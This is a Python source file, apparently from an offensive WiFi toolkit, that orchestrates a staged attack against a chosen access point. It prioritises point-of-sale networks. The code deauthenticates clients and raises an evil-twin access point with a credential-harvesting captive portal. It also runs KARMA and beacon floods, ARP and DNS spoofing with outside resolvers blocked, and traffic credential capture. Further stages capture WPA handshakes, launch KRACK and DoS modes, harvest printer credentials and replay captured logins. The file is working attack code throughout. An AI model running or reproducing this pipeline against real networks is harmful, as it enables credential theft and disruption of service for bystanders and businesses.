"""
Attack Orchestrator (Stage 3 — Unified Kill Chain)
──────────────────────────────────────────────────
Coordinated attack pipeline combining:
  • Network segmentation exploitation (rogue AP bridges isolated clients)
  • Deauthentication with native C packet injection
  • Rogue AP + captive portal (auto-cloned SSID/channel/security)
  • ARP cache poisoning (gateway impersonation)
  • DNS spoofing (wildcard + targeted domain redirect)
  • SSL stripping (HTTPS downgrade for credential capture)
  • Automated credential harvesting (HTTP/FTP/IMAP/portal)
  • WPA handshake capture → offline cracking pipeline

Phase Flow (tightly sequenced for maximum effectiveness):
  1. RECON       → Passive scan, identify targets, map network topology
  2. TARGET      → Select AP, assess segmentation, enumerate clients
  3. DISRUPT     → Deauth burst knocks clients off real AP
  4. CAPTURE     → Rogue AP catches displaced clients (same SSID/channel)
  5. POISON      → ARP + DNS spoofing on rogue AP network
  6. HARVEST     → Credential capture from portal + traffic interception
  7. PERSIST     → Background recon feeds new targets, KRACK on handshakes

The key improvement: phases are sequenced with timing gates so each phase
waits for the previous one to take effect before proceeding.
"""

import time
import threading
import os

from scapy.all import sniff, raw, RandMAC
from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt
from scapy.layers.eap import EAPOL

from .config import CHANNELS_24GHZ, WIFI_BROADCAST, NETWORK_GW_IP, log
from .database import POSDatabase
from .recon import ReconEngine
from .deauth import DeauthEngine
from .beacons import KnownBeaconsEngine
from .karma import KARMAEngine
from .rogueap import RogueAPEngine
from .handshake import HandshakeCapture
from .isolation import IsolationDetector
from .signal_targeting import SignalTargeting
from .cred_tester import CredentialTester
from .mitm import MITMEngine, HTTPInjector
from .ssl_strip import SSLStripper
from .dns_spoof import DNSSpoofEngine
from .cred_harvester import CredentialHarvester, CaptivePortalHarvester
from .network_disruption import NetworkDisruption, DeauthStorm
from .post_attack import PostAttackAnalyzer
from .ap_clone import APCloneEngine
from .krack import KRACKEngine
from .dos_wifi import WiFiDoSEngine
from .client_isolation import ClientIsolationEngine
from .printer_recon import PrinterRecon
from .print_interceptor import PrintJobInterceptor
from .printer_creds import PrinterCredentialHarvester as PrinterCredHarvester


class AttackOrchestrator:
    """
    Unified kill chain: Deauth → Rogue AP → ARP/DNS Spoof → Credential Harvest.

    Tightly coordinates timing between attack phases:
    - Deauth burst fires BEFORE rogue AP is visible (clients get knocked off)
    - Rogue AP starts with exact SSID/channel/security profile
    - Once clients connect to rogue AP, ARP + DNS poisoning activates
    - All credential paths harvest simultaneously (portal + traffic + EAPOL)

    The orchestrator tracks client state transitions:
      ASSOCIATED → DEAUTHED → PROBING → CONNECTED_TO_ROGUE → HARVESTING
    """

    def __init__(self, monitor_iface, ap_iface, db=None, channels=None,
                 target_bssid=None, target_ssid=None, target_channel=None,
                 recon_duration=30, enable_beacons=True,
                 enable_karma=True, test_credentials=False,
                 enable_isolation_check=True, signal_rssi_limit=-80,
                 enable_ap_clone=False, enable_krack=False,
                 enable_dos=False, dos_mode=None,
                 enable_client_isolation=False,
                 enable_printer_attacks=False,
                 plugins=None, plugins_dir=None):
        self.monitor_iface = monitor_iface
        self.ap_iface = ap_iface
        self.channels = channels or CHANNELS_24GHZ
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = target_channel
        self.recon_duration = recon_duration
        self.enable_beacons = enable_beacons
        self.enable_karma = enable_karma
        self.test_credentials = test_credentials
        self.enable_isolation_check = enable_isolation_check
        self.signal_rssi_limit = signal_rssi_limit

        # Attack module flags
        self.enable_ap_clone = enable_ap_clone
        self.enable_krack = enable_krack
        self.enable_dos = enable_dos
        self.dos_mode = dos_mode or "cts_flood"
        self.enable_client_isolation = enable_client_isolation
        self.enable_printer_attacks = enable_printer_attacks

        self.db = db or POSDatabase()
        self.recon = ReconEngine(monitor_iface, self.db, channels=self.channels)
        self.deauth = DeauthEngine(monitor_iface)
        self.rogue_ap = None
        self.beacons = None
        self.karma = None
        self.handshakes = HandshakeCapture()
        self.signal_filter = SignalTargeting(rssi_threshold=signal_rssi_limit)
        self.cred_tester = CredentialTester(monitor_iface) if test_credentials else None
        self.isolation_detector = None

        # Spoofing + harvesting engines
        self.mitm_engine = None
        self.ssl_stripper = None
        self.dns_spoof = None
        self.cred_harvester = None
        self.portal_harvester = None
        self.network_disruption = None

        # Advanced WiFi attack modules
        self.ap_clone = None
        self.krack_engine = None
        self.dos_engine = None
        self.client_isolation = None

        # Printer attack modules
        self.printer_recon = None
        self.print_interceptor = None
        self.printer_cred_harvester = None

        # Plugin system
        self._plugin_loader = None
        self._active_plugins = []
        self._plugins_dir = plugins_dir
        self._requested_plugins = plugins

        # Client state tracking
        self._client_states = {}  # mac -> state string
        self._rogue_connections = set()  # clients that connected to rogue AP
        self._harvested_from = set()  # clients we've gotten creds from
        self._isolation_detected = False

        self.running = False

    def load_plugins(self, plugin_dirs=None):
        """Discover and load available attack plugins."""
        from .plugin_loader import PluginLoader

        dirs = []
        if self._plugins_dir:
            dirs.append(self._plugins_dir)
        if plugin_dirs:
            dirs.extend(plugin_dirs)

        self._plugin_loader = PluginLoader(plugin_dirs=dirs if dirs else None)
        count = self._plugin_loader.discover()

        if self._requested_plugins:
            for plugin in self._plugin_loader.list_plugins():
                if plugin.name() not in self._requested_plugins:
                    self._plugin_loader.disable_plugin(plugin.name())

        self._active_plugins = self._plugin_loader.get_enabled_plugins()
        log.info(f"Plugin system: {count} discovered, "
                 f"{len(self._active_plugins)} active")
        return count

    def get_plugin_loader(self):
        """Return the PluginLoader instance (or None if not initialized)."""
        return self._plugin_loader

    def _auto_select_target(self):
        """Select target from recon data. POS APs get priority."""
        if self.target_bssid and self.target_ssid and self.target_channel:
            return True

        # Try POS AP first
        row = self.db.get_strongest_pos_ap()
        if not row:
            row = self.db.get_strongest_ap()
        if not row:
            log.error("No targets found in recon data")
            return False

        self.target_bssid = row[0]
        self.target_ssid = row[1] or "FreeWiFi"
        self.target_channel = row[2] or 6
        vendor = row[3] if len(row) > 3 else "Unknown"
        rssi = row[4] if len(row) > 4 else -100

        log.info(f"Auto-selected target: '{self.target_ssid}' ({self.target_bssid}) "
                 f"ch {self.target_channel} | {vendor} | {rssi}dBm")
        return True

    def _assess_segmentation(self, close_clients):
        """
        Determine network segmentation posture and adapt attack strategy.

        Checks:
          - AP isolation (client-to-client blocked)
          - VLAN segmentation (different subnets per client)
          - Portal-gated networks (already have captive portal)

        Adapts attack based on findings:
          - If isolated: heavier deauth + rely on rogue AP (not MITM on real network)
          - If not isolated: can MITM on the real network segment too
          - If portal-gated: clone the existing portal for credential replay
        """
        log.info("Assessing network segmentation...")

        if not self.enable_isolation_check:
            log.info("  Isolation check disabled, assuming open network")
            return

        self.isolation_detector = IsolationDetector(
            self.monitor_iface, self.target_bssid, self.db)

        if self.isolation_detector.detect(timeout=20):
            self._isolation_detected = True
            log.warning("  ⚠ AP ISOLATION DETECTED")
            log.warning("  Strategy: heavier deauth → rogue AP is primary capture path")
            log.warning("  MITM on real network not viable (clients isolated)")
        else:
            self._isolation_detected = False
            log.info("  ✓ No isolation — MITM on real network is viable")
            log.info("  Strategy: dual-path capture (rogue AP + real network MITM)")

    def _phase_deauth_burst(self, close_clients, rogue_mac):
        """
        Phase 3: Coordinated deauth burst.

        Fires a heavy initial deauth salvo BEFORE rogue AP beacons are visible.
        This ensures clients deauthenticate and enter probing state simultaneously.
        Then immediately starts the rogue AP so displaced clients see our SSID first.

        The deauth continues in background to prevent re-association with real AP.
        """
        log.info("─" * 50)
        log.info("PHASE 3: DISRUPTION — Deauth burst")
        log.info("─" * 50)

        # Set all close clients as targets
        self.deauth.add_target(self.target_bssid, close_clients)

        # Track client state transitions
        for mac in close_clients:
            self._client_states[mac] = "DEAUTHING"

        # Fire initial heavy burst (higher count than normal operation)
        # This ensures all clients get knocked off simultaneously
        self.deauth.start()
        log.info(f"  Deauth burst: {len(close_clients)} clients + broadcast")

        # Let the deauth take effect — clients need 1-3 seconds to deauthenticate
        time.sleep(2)

        # Now start beacons + KARMA so displaced clients see our SSID immediately
        if self.enable_beacons:
            self.beacons = KnownBeaconsEngine(self.monitor_iface, rogue_mac)
            self.beacons.add_probed_ssids_from_db(self.db)
            self.beacons.start()
            log.info("  Beacon flood active (probed SSIDs from scan)")

        if self.enable_karma:
            self.karma = KARMAEngine(self.monitor_iface, rogue_mac)
            self.karma.start()
            log.info("  KARMA active — responding to all probe requests")

        for mac in close_clients:
            self._client_states[mac] = "PROBING"

    def _phase_rogue_ap(self, rogue_mac):
        """
        Phase 4: Rogue AP capture.

        Starts the evil twin AP with exact SSID and channel match.
        Captive portal is configured to harvest credentials.
        DNS wildcard ensures all HTTP traffic hits our portal.
        """
        log.info("─" * 50)
        log.info("PHASE 4: CAPTURE — Rogue AP + Captive Portal")
        log.info("─" * 50)

        self.rogue_ap = RogueAPEngine(
            interface=self.ap_iface,
            ssid=self.target_ssid,
            channel=self.target_channel,
            db=self.db,
            mac_address=rogue_mac,
        )

        if not self.rogue_ap.start():
            log.error("  ✗ Failed to start rogue AP")
            return False

        log.info(f"  ✓ Rogue AP active: '{self.target_ssid}' ch{self.target_channel}")
        log.info(f"  Portal: http://{NETWORK_GW_IP}:80")

        # Start captive portal credential harvester (watches AP interface traffic)
        self.portal_harvester = CaptivePortalHarvester(self.ap_iface)
        threading.Thread(target=self.portal_harvester.start, daemon=True,
                         name="portal-harvester").start()
        log.info("  ✓ Portal credential harvester active")

        return True

    def _phase_poison(self):
        """
        Phase 5: ARP + DNS poisoning on the rogue AP network.

        Once clients connect to our rogue AP, we own the network segment.
        This phase activates:
          - DNS spoofing: redirect all domains to our portal
          - ARP poisoning: intercept traffic between clients and "gateway"
          - SSL stripping: downgrade HTTPS where possible
          - Network credential harvester: capture plaintext credentials

        For non-isolated real networks, also MITM the real network segment.
        """
        log.info("─" * 50)
        log.info("PHASE 5: POISON — ARP + DNS + SSL Strip")
        log.info("─" * 50)

        # ─── DNS Spoofing (on AP interface — our rogue network) ───────────────
        # dnsmasq already does wildcard DNS, but this catches any DNS that
        # bypasses dnsmasq (e.g., hardcoded DNS servers like 8.8.8.8)
        self.dns_spoof = DNSSpoofEngine(self.ap_iface, spoof_ip=NETWORK_GW_IP)
        self.dns_spoof.add_common_targets()
        # Block external DNS resolvers so traffic must use our spoofed responses
        self.dns_spoof.block_domain("dns.google")
        self.dns_spoof.block_domain("dns.cloudflare.com")
        self.dns_spoof.start()
        log.info("  ✓ DNS spoofing active (wildcard → portal)")

        # ─── Credential Harvester (on AP interface — monitors all traffic) ────
        self.cred_harvester = CredentialHarvester(self.ap_iface, self.db)
        threading.Thread(target=self.cred_harvester.start, daemon=True,
                         name="cred-harvester").start()
        log.info("  ✓ Credential harvester active (HTTP/FTP/IMAP/POP3/SMTP)")

        # ─── MITM on real network (only if not isolated) ─────────────────────
        if not self._isolation_detected:
            # ARP poison the real network too for dual-path credential capture
            # This catches credentials from clients that DON'T connect to rogue AP
            try:
                self.mitm_engine = MITMEngine(self.monitor_iface)
                log.info("  ✓ MITM engine ready for real network segment")
            except Exception as e:
                log.warning(f"  MITM init failed (non-critical): {e}")
                self.mitm_engine = None
        else:
            log.info("  ─ Skipping real-network MITM (AP isolation detected)")
            log.info("  ─ All credential capture via rogue AP path")

    def _phase_advanced_attacks(self, close_clients):
        """
        Phase 6: Additional attack modules (KRACK, DoS, AP clone, printers).

        These run alongside the main kill chain for additional coverage.
        """
        log.info("─" * 50)
        log.info("PHASE 6: ADVANCED — Supplementary attacks")
        log.info("─" * 50)

        if self.enable_ap_clone:
            self.ap_clone = APCloneEngine(
                self.monitor_iface, self.db, self.target_bssid,
                self.target_ssid, self.target_channel)
            self.ap_clone.start()
            log.info("  ✓ AP Clone engine (channel switching)")

        if self.enable_client_isolation:
            self.client_isolation = ClientIsolationEngine(self.monitor_iface, self.db)
            for c in close_clients:
                self.client_isolation.add_target(c, self.target_bssid)
            self.client_isolation.start()
            log.info("  ✓ Client isolation engine")

        if self.enable_dos:
            self.dos_engine = WiFiDoSEngine(
                self.monitor_iface, self.target_bssid, self.target_channel)
            self.dos_engine.start(mode=self.dos_mode)
            log.info(f"  ✓ WiFi DoS engine (mode={self.dos_mode})")

        if self.enable_printer_attacks:
            self.printer_recon = PrinterRecon(self.ap_iface, self.db)
            threading.Thread(target=self.printer_recon.start, daemon=True,
                             name="printer-recon").start()
            log.info("  ✓ Printer reconnaissance")

            self.printer_cred_harvester = PrinterCredHarvester(self.ap_iface, self.db)
            threading.Thread(target=self.printer_cred_harvester.start, daemon=True,
                             name="printer-creds").start()
            log.info("  ✓ Printer credential harvester")

    def start(self):
        """Execute the full unified kill chain."""
        self.running = True
        self._attack_start_time = time.time()
        log.info("=" * 60)
        log.info("UNIFIED KILL CHAIN INITIATED")
        log.info(f"  Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        log.info(f"  Monitor: {self.monitor_iface}")
        log.info(f"  AP:      {self.ap_iface}")
        log.info("=" * 60)

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 1: PASSIVE RECON
        # ══════════════════════════════════════════════════════════════════════
        log.info("─" * 50)
        log.info("PHASE 1: RECON — Passive network discovery")
        log.info("─" * 50)
        self.recon.set_signal_targeting(self.signal_filter)
        self.recon.start(timeout=self.recon_duration)
        self.recon.stop()

        stats = self.db.get_stats()
        log.info(f"  Found: {stats['access_points']} APs "
                 f"({stats['pos_access_points']} POS), "
                 f"{stats['clients']} clients ({stats['pos_clients']} POS)")

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 2: TARGET SELECTION + SEGMENTATION ASSESSMENT
        # ══════════════════════════════════════════════════════════════════════
        log.info("─" * 50)
        log.info("PHASE 2: TARGET — Selection + segmentation assessment")
        log.info("─" * 50)

        if not self._auto_select_target():
            self.running = False
            return False

        # Get client list for the target AP
        all_clients_data = self.db.get_clients_for_bssid(self.target_bssid)
        all_clients = set()
        close_clients = set()

        for client_mac, rssi in all_clients_data:
            all_clients.add(client_mac)
            if self.signal_filter.should_deauth(client_mac):
                close_clients.add(client_mac)
            elif rssi is not None and self.signal_filter.should_deauth_with_rssi(client_mac, rssi):
                close_clients.add(client_mac)

        log.info(f"  Clients in range: {len(close_clients)}/{len(all_clients)} "
                 f"(RSSI > {self.signal_rssi_limit}dBm)")

        # Assess segmentation — determines attack strategy
        self._assess_segmentation(close_clients)

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 3: DEAUTH BURST (knock clients off real AP)
        # ══════════════════════════════════════════════════════════════════════
        rogue_mac = str(RandMAC())
        self._phase_deauth_burst(close_clients, rogue_mac)

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 4: ROGUE AP (catch displaced clients)
        # ══════════════════════════════════════════════════════════════════════
        if not self._phase_rogue_ap(rogue_mac):
            log.error("Kill chain aborted — rogue AP failed")
            self.running = False
            return False

        # Let clients connect (they're probing now after deauth)
        log.info("  Waiting for client connections (3s)...")
        time.sleep(3)

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 5: ARP/DNS POISONING + CREDENTIAL HARVESTING
        # ══════════════════════════════════════════════════════════════════════
        self._phase_poison()

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 6: ADVANCED ATTACKS (parallel)
        # ══════════════════════════════════════════════════════════════════════
        self._phase_advanced_attacks(close_clients)

        # ══════════════════════════════════════════════════════════════════════
        # PHASE 7: BACKGROUND RECON + HANDSHAKE CAPTURE (persistent)
        # ══════════════════════════════════════════════════════════════════════
        log.info("─" * 50)
        log.info("PHASE 7: PERSIST — Background recon + handshake capture")
        log.info("─" * 50)

        self.recon.running = True
        threading.Thread(target=self._background_recon, daemon=True,
                         name="bg-recon").start()

        # Credential verification thread (tests captured creds against real AP)
        if self.test_credentials and self.cred_tester:
            threading.Thread(target=self._credential_verification_loop, daemon=True,
                             name="cred-verify").start()
            log.info("  ✓ Credential verification loop active")

        log.info("  ✓ Background recon feeding new clients into deauth")

        # ══════════════════════════════════════════════════════════════════════
        # ATTACK ACTIVE — Status summary
        # ══════════════════════════════════════════════════════════════════════
        log.info("")
        log.info("═" * 60)
        log.info("  KILL CHAIN ACTIVE")
        log.info("═" * 60)
        log.info(f"  Target:   {self.target_bssid} ('{self.target_ssid}') ch{self.target_channel}")
        log.info(f"  Rogue AP: {self.ap_iface} [{rogue_mac}]")
        log.info(f"  Deauth:   {len(close_clients)} clients + broadcast (native C)")
        log.info(f"  Beacons:  {'✓' if self.enable_beacons else '✗'} | "
                 f"KARMA: {'✓' if self.enable_karma else '✗'}")
        log.info(f"  DNS:      Wildcard → {NETWORK_GW_IP}")
        log.info(f"  Harvest:  Portal + Traffic + EAPOL")
        log.info(f"  Segment:  {'ISOLATED (rogue-only path)' if self._isolation_detected else 'OPEN (dual-path)'}")
        log.info("═" * 60)
        log.info("  Ctrl+C to stop and generate report")
        log.info("")
        return True

    def _credential_verification_loop(self):
        """
        Periodically check for new credentials and test them against the real AP.

        Runs as a background thread. Every 30 seconds, pulls new untested
        credentials from the database and attempts to verify them:
          - WiFi passwords: try connecting to the real AP
          - Web credentials: try HTTP auth against known portals
          - Admin panels: try default and harvested credentials
        """
        tested_keys = set()
        while self.running:
            time.sleep(30)
            if not self.running:
                break

            try:
                creds = self.db.get_credentials_list()
                for cred in creds:
                    key = (cred['client_ip'], cred['username'], cred['password'])
                    if key in tested_keys:
                        continue
                    tested_keys.add(key)

                    if self.cred_tester and self.target_bssid and self.target_ssid:
                        self.cred_tester.add_credentials(
                            bssid=self.target_bssid,
                            ssid=self.target_ssid,
                            username=cred['username'],
                            password=cred['password'],
                        )
                        log.info(f"  Queued credential for testing: {cred['username']}:*****")
            except Exception as e:
                log.debug(f"Credential verification error: {e}")

        # Run final test batch
        if self.cred_tester:
            try:
                self.cred_tester.run_tests()
            except Exception:
                pass

    def _background_recon(self):
        """
        Continue sniffing to discover new clients and auto-add to deauth.

        Also captures EAPOL handshakes and triggers KRACK on completion.
        New clients are immediately added to the deauth target list so
        the kill chain stays effective against late-joining devices.
        """
        def handler(pkt):
            self.recon.packet_handler(pkt)

            # Capture EAPOL handshakes
            if pkt.haslayer(EAPOL):
                eapol_layer = pkt.getlayer(EAPOL)
                eapol_raw = raw(eapol_layer)
                msg_num = self.recon._identify_eapol_message(eapol_raw)
                if msg_num:
                    ds_flags = pkt.FCfield & 0x3
                    if ds_flags == 0x1:
                        client_mac, bssid = pkt.addr2, pkt.addr1
                    elif ds_flags == 0x2:
                        client_mac, bssid = pkt.addr1, pkt.addr2
                    else:
                        client_mac, bssid = pkt.addr2, (pkt.addr3 or pkt.addr1)
                    if client_mac and bssid:
                        self.handshakes.add_frame(client_mac, bssid, pkt, msg_num)
                        if self.handshakes.is_complete(client_mac, bssid):
                            pcap_file = self.handshakes.export_pcap(client_mac, bssid)
                            if pcap_file:
                                log.info(f"  ✓ Full handshake → {pcap_file}")
                            # Trigger KRACK if enabled
                            if self.enable_krack and not self.krack_engine:
                                self.krack_engine = KRACKEngine(
                                    self.monitor_iface, client_mac, bssid)
                                self.krack_engine.start()
                                log.info(f"  ✓ KRACK launched against {client_mac}")

            # Dynamically add newly seen clients of the target AP to deauth
            if pkt.haslayer(Dot11) and pkt.type == 2:
                client = pkt.addr2
                bssid = pkt.addr3
                if (bssid == self.target_bssid and client
                        and client != bssid and client != WIFI_BROADCAST):
                    if self.signal_filter.should_deauth(client):
                        current = self.deauth._targets.get(self.target_bssid, set())
                        if client not in current:
                            self.deauth.add_target(self.target_bssid, [client])
                            self._client_states[client] = "DEAUTHING"
                            log.info(f"  + New client auto-targeted: {client}")

            # KARMA: respond to all probe requests from displaced clients
            if self.enable_karma and pkt.haslayer(Dot11ProbeReq):
                ssid_elt = pkt.getlayer(Dot11Elt)
                ssid = ""
                if ssid_elt and ssid_elt.ID == 0 and ssid_elt.info:
                    ssid = ssid_elt.info.decode(errors='ignore')
                client_mac = pkt.addr2
                if client_mac and self.karma:
                    self.karma.on_probe_request(client_mac, ssid)

        try:
            sniff(iface=self.monitor_iface, prn=handler, store=0,
                  stop_filter=lambda x: not self.running)
        except Exception as e:
            log.debug(f"Background recon ended: {e}")

    def stop(self):
        """Shut down all attack components gracefully and generate report."""
        self.running = False

        if hasattr(self, '_attack_start_time'):
            duration = time.time() - self._attack_start_time
            log.info(f"\nAttack duration: {duration:.1f} seconds")

        # Stop all engines
        engines = [
            self.recon, self.deauth, self.beacons, self.karma,
            self.rogue_ap, self.mitm_engine, self.ssl_stripper,
            self.dns_spoof, self.cred_harvester, self.portal_harvester,
            self.network_disruption, self.ap_clone, self.krack_engine,
            self.dos_engine, self.client_isolation, self.printer_recon,
            self.print_interceptor, self.printer_cred_harvester
        ]

        for engine in engines:
            if engine:
                try:
                    engine.stop()
                except Exception as e:
                    log.debug(f"Error stopping {engine.__class__.__name__}: {e}")

        # Wait for daemon threads with a join timeout
        for engine in engines:
            if engine and hasattr(engine, '_thread') and engine._thread is not None:
                try:
                    engine._thread.join(timeout=3)
                except Exception:
                    pass

        # Export handshakes
        remaining = self.handshakes.export_all()
        if remaining:
            log.info(f"Exported {len(remaining)} handshakes")

        # Print harvest summary
        self._print_harvest_summary()

        # Run post-attack analysis
        self.recon._print_status()
        self._run_post_attack_analysis()

        # Close database last
        if self.db:
            self.db.flush()
            self.db.close()

        log.info("Kill chain terminated. All data saved.")

    def _print_harvest_summary(self):
        """Print summary of all credentials and data harvested."""
        log.info("")
        log.info("─" * 50)
        log.info("HARVEST SUMMARY")
        log.info("─" * 50)

        # Credential stats
        total_creds = 0
        if self.cred_harvester:
            stats = self.cred_harvester.get_stats()
            total_creds += stats.get("total_credentials", 0)
            if stats.get("by_protocol"):
                for proto, count in stats["by_protocol"].items():
                    log.info(f"  {proto}: {count} credentials")

        if self.portal_harvester:
            portal_creds = len(self.portal_harvester.get_credentials())
            total_creds += portal_creds
            if portal_creds:
                log.info(f"  Captive Portal: {portal_creds} credentials")

        # DNS stats
        if self.dns_spoof:
            dns_stats = self.dns_spoof.get_spoof_stats()
            log.info(f"  DNS spoofed: {dns_stats.get('total_spoofs', 0)} responses")

        # Handshake stats
        hs_stats = self.handshakes.get_stats()
        if hs_stats.get("complete", 0):
            log.info(f"  WPA Handshakes: {hs_stats['complete']} complete")

        log.info(f"  TOTAL CREDENTIALS: {total_creds}")
        log.info("─" * 50)

    def _run_post_attack_analysis(self):
        """Generate post-attack analysis and next steps."""
        log.info("")
        log.info("═" * 60)
        log.info("POST-ATTACK ANALYSIS")
        log.info("═" * 60)

        analyzer = PostAttackAnalyzer(self.db)
        analyzer.print_summary()
        analyzer.export_credentials()
        analyzer.export_handshakes()
        analyzer.generate_report("exports/attack_report.json")

        log.info("\nNEXT STEPS:")
        for i, step in enumerate(analyzer.get_next_steps(priority_filter="HIGH"), 1):
            log.info(f"  {i}. {step}")

        log.info("═" * 60)
